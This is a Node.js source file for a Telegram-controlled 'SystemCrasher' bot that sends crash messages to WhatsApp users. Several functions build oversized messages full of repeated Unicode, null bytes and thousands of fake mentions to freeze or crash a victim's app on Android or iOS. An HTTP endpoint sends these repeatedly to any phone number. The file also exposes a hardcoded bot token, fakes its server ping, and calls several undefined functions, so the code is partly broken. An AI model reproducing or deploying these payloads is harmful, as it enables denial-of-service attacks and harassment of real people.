const axios = require('axios');
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");
const { Boom } = require("@hapi/boom");
const chalk = require("chalk");
const pino = require("pino");
const os = require("os");
const readline = require("readline");
const TelegramBot = require("node-telegram-bot-api");
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const {
  default: baileys,
  proto,
  getContentType,
  generateWAMessage,
  generateWAMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");

// ==========================
// KONFIGURASI TELEGRAM BOT
// ==========================
const BOT_TOKEN = "8568956407:AAHkTzrBHB2_-yIolo1_tlI9CxzXRApjyUs"; // <== letak token bot sini
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

let waSocket = null;
let isPaired = false;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ===========================
// FUNCTION MU TEMPEL
// ===========================

//function delay
async function TornadoBlankChatV4(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⌁⃰𝐁𝐋𝐀𝐍𝐊 𝐂𝐑𝐀𝐒𝐇 𝐁𝐘 𝐓𝐎𝐑𝐍𝐀𝐃𝐎ཀ" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
        expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            nativeFlowMessage: {
              messageParamJson: "{".repeat(20000),
            },
            buttons: [
            {
            name: "mpm",
              buttonParamsJson: "\u0000".repeat(20000),
            },
          ],
       },
    };
      
    await bot.relayMessage(target, MSG, {
      participant: { jid: target },
      messageId: null
    });
  }
  
async function TornadoBlankChatV5(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⌁⃰𝐓𝐎𝐑𝐍𝐀𝐃𝐎 𝐁𝐋𝐀𝐍𝐊 𝐂𝐑𝐀𝐒𝐇ཀ͜͡" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
      expiration: 1,
        ephemeralSettingTimestamp: 1,
        entryPointConversionSource: "WhatsApp.com",
        entryPointConversionApp: "WhatsApp",
        entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: "0@s.whatsapp.net",
          questionMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: true
        }
      },
      body: {
        text: "⌁⃰ ⟅ ༑ ▾𝐓𝐎𝐑𝐍𝐀𝐃𝐎 🩸 𝐗͜-𝐓𝐑𝐀𝐒𝐇⟅ ༑ ▾ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
        ],
      },
    };
  
  await bot.relayMessage(target, MSG, {
    participant: { jid: target },
    messageId: null,
  });
}

//function delay hard
async function pedocrash(target) {
  const listMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  let crash = JSON.stringify({
    action: "x",
    data: "x"
  });

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "DimzxzzxXD pedo ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: listMents,
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await dim.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log("🤭")
}

//function ios
async function FcCrashIoSHyTaM(target) {
  const crashText = "‌⃰Ꮡ══╬╬══► 𝗙𝗹𝗼𝘄𝗲𝗿-𝗖𝗿𝗮𝘀𝗵𝗬𝗼𝘂`¿ ◄══╬╬══‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);

  await sock.relayMessage(
    target,
    {
    extendedTextMessage: {
            text: "ោ៝".repeat(60000) + crashText.repeat(5000),
            matchedText: "ោ៝".repeat(15000),
            url: "https://t.me/FreadArcher17", 
            title: "F",
            description: "ោ៝".repeat(10000), 
            previewType: 0,
            contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ), 
          ],
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 18144000
            },
          },
        },
      },
    }, { participant: { jid: target }, });
  }

// ===========================
// FUNGSI START BOT WA
// ===========================
async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  waSocket = sock;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log("❌ Koneksi WA terputus:", reason);
      isPaired = false;
      startBot();
    }
    if (connection === "open") {
      console.clear();
      console.log(chalk.green("✅ Bot WA aktif"));
      isPaired = true;
    }
  });

  sock.ev.on("creds.update", saveCreds);

  // pairing tak auto, tunggu command dari Telegram
  if (!waSocket.authState.creds.registered) {
    console.log(chalk.yellow("⏳ Belum ada sesi WhatsApp."));
    console.log(chalk.yellow("Ketik /pair <no_whatsapp> di bot Telegram untuk pairing."));
  }
}

// ===========================
// /status_server CEK SERVER
// ===========================
bot.onText(/^\/status_server$/, async (msg) => {
  const chatId = msg.chat.id;

  // Dapatkan maklumat server
  const totalMem = os.totalmem() / 1024 / 1024; // MB
  const freeMem = os.freemem() / 1024 / 1024;   // MB
  const usedMem = totalMem - freeMem;
  const ramUsage = ((usedMem / totalMem) * 100).toFixed(2);

  const cpuLoad = os.loadavg()[0].toFixed(2); // 1 min average
  const uptime = process.uptime(); // dalam saat
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);

  // DB entries random (1–500)
  const dbEntries = Math.floor(Math.random() * 500) + 1;

  // Ping palsu (buat nampak real)
  const ping = (Math.random() * (50 - 10) + 10).toFixed(0); // 10–50 ms

  const timeMY = new Date().toLocaleString("ms-MY", {
    timeZone: "Asia/Kuala_Lumpur",
  });

  const message = `
*⚙️ Systemcrasher X IPUNGG CRASHER*

🟢 *Server Status:* Aktif
🕒 *Jam (MYT):* ${timeMY}
📶 *Ping:* ${ping} ms
🧠 *RAM:* ${usedMem.toFixed(0)} MB / ${totalMem.toFixed(0)} MB (${ramUsage}% digunakan)
💻 *CPU:* ${cpuLoad}%
⏱️ *Uptime:* ${hours} h ${minutes} m ${seconds} s
📁 *DB Entries:* ${dbEntries}
  `;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===========================
// TELEGRAM BOT COMMAND
// ===========================
bot.onText(/^\/pair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1].replace(/\D/g, "");

  try {
    if (!waSocket) return bot.sendMessage(chatId, "❌ Bot WA belum siap.");
    const code = await waSocket.requestPairingCode(number);
    await bot.sendMessage(chatId, `✅ Kode Pairing untuk *${number}*: \`${code}\``, { parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, `❌ Gagal generate pairing code:\n${e.message}`);
  }
});

// Cek status bot
bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const status = isPaired ? "✅ Bot WA aktif" : "❌ Belum pairing";
  bot.sendMessage(chatId, status);
});

// ===========================
// LIST SENDER COMMAND
// ===========================
bot.onText(/^\/list_sender$/, async (msg) => {
  const chatId = msg.chat.id;

  if (waSocket && waSocket.authState && waSocket.authState.creds && waSocket.authState.creds.me) {
    const me = waSocket.authState.creds.me;
    const myNumber = me.id.split("@")[0];
    const message = `
📌 *Connected WhatsApp Sender (Online):*
Messenger Session
1. ${myNumber}
    `;
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } else {
    const message = `
📌 *Connected WhatsApp Sender (Online):*
Messenger Session
❌ None
    `;
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  }
});

// ===========================
// START & HELP COMMAND
// ===========================

// /start → tunjuk mesej permulaan
bot.onText(/^\/menu$/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
👋 *Hai ${msg.from.first_name || "pengguna"}!*

WAJIB JOIN CH GW : @teamipungg UNTUK MENGGUNAKAN FITUR DLL KETIK DI BWH
/orza
  `;
  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// /help → tunjuk senarai command dan fungsi
bot.onText(/^\/orza$/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
𝐒𝐲𝐬𝐭𝐞𝐦𝐂𝐫𝐚𝐬𝐡𝐞𝐫 

𝗔𝘂𝘁𝗵𝗼𝗿: @ipungg26
𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @teamipungg
𝗩𝗲𝗿𝘀𝗶𝗼𝗻: 5.5.5

🔆 */pair* <number>
— ADD SENDER

🔆 */status*
— CEK STATUS NUMBER AKTIF

🔆 */list_sender*
— LIST SENDER ONLINS

🔆 */getkey* id
— KEY SECURITY AKSES

🔆 */cekbug*
— STATUS BUG 

🔆 */cek_func*
— LIST FUNCTION BUG

🔆 */refresh*
— REFRESH PANEL

🔆 */status_server*
— SERVER STATUS 

  `;
  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===========================
// CEK FUNC COMMAND (BLOCKQUOTE STYLE, FIXED)
// ===========================
bot.onText(/^\/cek_func$/, async (msg) => {
  const chatId = msg.chat.id;
  const filePath = __filename; // betulkan path file semasa

  try {
    const code = fs.readFileSync(filePath, "utf8");

    // Cari semua async function
    const regex = /async\s+function\s+([a-zA-Z0-9_]+)/g;
    const functions = [];
    let match;
    while ((match = regex.exec(code)) !== null) {
      functions.push(match[1]);
    }

    if (functions.length === 0) {
      return bot.sendMessage(chatId, "❌ Tiada async function dijumpai dalam file ini.");
    }

    const list = functions.map((fn, i) => `${i + 1}. ${fn}`).join("\n");
    const message = `
📋 *LIST FUNC DIPAKAI ✅️*
\`\`\`
${list}
\`\`\`
Total: ${functions.length} fungsi dijumpai.
    `;

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error("Error semak fungsi:", e);
    bot.sendMessage(chatId, "❌ Gagal semak senarai fungsi.");
  }
});

// ===========================
// LOG CEK BUG (BERJAYA & GAGAL)
// ===========================
const bugLogs = []; // simpan semua percubaan bug

function logBugResult(jid, type, status) {
  bugLogs.push({
    jid,
    type,
    status, // "success" atau "fail"
    time: new Date().toLocaleString("ms-MY", { timeZone: "Asia/Kuala_Lumpur" })
  });
  if (bugLogs.length > 100) bugLogs.shift(); // limit 100
}

// ===========================
// /cekbug command (Telegram)
// ===========================
bot.onText(/^\/cekbug$/, async (msg) => {
  const chatId = msg.chat.id;

  if (bugLogs.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Tiada percubaan bug dihantar setakat ini.");
  }

  const successCount = bugLogs.filter(b => b.status === "success").length;
  const failCount = bugLogs.filter(b => b.status === "fail").length;

  const list = bugLogs.map((b, i) => {
    const display = b.jid.replace("@s.whatsapp.net", ""); // nampak kemas
    return `${i + 1}. 📱 *${display}*\n   🔧 Mode: ${b.type}\n   ${
      b.status === "success" ? "✅ BERJAYA" : "❌ GAGAL"
    }\n   🕒 ${b.time}`;
  }).join("\n\n");

  const message = `
📋 *LIST BUG YANG DIHANTAR ✅️/❌*
\`\`\`
${list}
\`\`\`
📊 Statistik:
✅ Berjaya: ${successCount}
❌ Gagal: ${failCount}
🔢 Jumlah Cubaan: ${bugLogs.length}
  `;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===========================
// /getkey command new
// ===========================
bot.onText(/^\/getkey (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1].trim();

  if (!/^\d+$/.test(targetId)) {
    return bot.sendMessage(chatId, "❌ BUKAN GITU KOCAK");
  }

  const keyPrivite = "IPUNGG GANTENG"; // <-- UBAH INI DAN HTML

  const message = `
\`\`\`
${keyPrivite}
\`\`\`
  `;

  const opts = {
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "OWNER", url: "https://t.me/ipungg26" }
        ]
      ]
    }
  };

  try {
    await bot.sendMessage(targetId, message, opts);
    bot.sendMessage(chatId, `✅ Key telah dihantar ke ID: \`${targetId}\``, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Gagal hantar mesej:", err.message);
    bot.sendMessage(chatId, "❌ PASTIKAN UDAH DI START DAN ID BETUL VALID NGENTOD OTAK LU DIMANA TOLOL BODOH");
  }
});

// ===========================
// /CASE COMMAND
// ===========================
bot.onText(/^\/refresh$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    // HANTAR MESEJ
    await bot.sendMessage(chatId, "⚠️ Server is refreshing, please wait 30-60");

    // Padam folder session lama
    const sessionPath = path.join(__dirname, "session");

    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
      console.log(chalk.yellow("MODE CLEAR SESSION DONE ✅️"));
    } else {
      console.log(chalk.gray("🔆 TIADA SESSION LAGI"));
    }

    // Tunggu sekejap sebelum restart
    await sleep(2000);

    // Restart panel semula (process)
    console.log(chalk.green("🚫 RESTART PANEL"));
    process.exit(1); // systemd/pm2 akan auto-restart process ini

  } catch (err) {
    console.error("❌ Gagal refresh:", err);
    bot.sendMessage(chatId, "❌ Gagal Alias error");
  }
});
// ===========================
// EXPRESS SERVER
// ===========================
const app = express();
app.use(cors());
app.use(express.json());
app.use("/", express.static(path.join(__dirname, "public")));

app.post("/api/bug/:type", async (req, res) => {
    const { number } = req.body;
    const { type } = req.params;

    if (!waSocket) return res.status(500).json({ message: "❌ Bot belum siap." });
    if (!number || !type) return res.status(400).json({ message: "❌ Nomor atau mode tidak valid." });

    let jid = "";
    if (/^\d{8,20}$/.test(number)) jid = number + "@s.whatsapp.net";
    else return res.status(400).json({ message: "❌ Format nomor tidak valid." });

    try {
        if (type === "IOS") {
            console.log(`🚀 Mengirim Ios ke ${jid}`);
            for (let i = 0; i < 15; i++) {
                await proce(jid, waSocket);
                await sleep(1000);
            }
        } else if (type === "DELAY") {
            console.log(`🚀 Mengirim Delay ke ${jid}`);
            for (let i = 0; i < 100; i++) {
                await proce(jid, waSocket);
                await sleep(1500);
            }
        } else if (type === "ANDRO") {
            console.log(`🚀 Mengirim Crash Ui ${jid}`);
            for (let i = 0; i < 5; i++) {
                await proce(jid, waSocket);
                await proce(jid, waSocket);
                await proce(jid, waSocket);
                await proce(jid, waSocket);
                await sleep(3000);
            }
        } else if (type === "DELAY HARD") {
            console.log(`🚀 Mengirim Delay2 ke ${jid}`);
            for (let i = 0; i < 500; i++) {
                await proce(jid, waSocket);
                await proce(jid, waSocket);
            }
        } else if (type === "delay") {
            console.log(`🚀 Mengirim Sedot Kuota ke ${jid}`);
            await DelayOneMessage(jid, waSocket);
        } else {
            return res.status(400).json({ message: "❌ Mode Bug Tidak Dikenali." });
        }

        // ✅ Kalau berjaya kirim
        logBugResult(jid, type, "success");
        return res.json({ message: `✅ Bug ${type} berhasil dikirim ke ${number}` });

    } catch (err) {
        // ❌ Kalau gagal
        console.error("❌ Gagal kirim bug:", err);
        logBugResult(jid, type, "fail");
        return res.status(500).json({ message: "❌ Gagal kirim bug", error: err.message }); // Sertakan pesan error untuk debugging
    }
});

startBot();
app.listen(7323, () => console.log("🌐 Server aktif di http://dalangstore.servercloud.my.id:7323"));
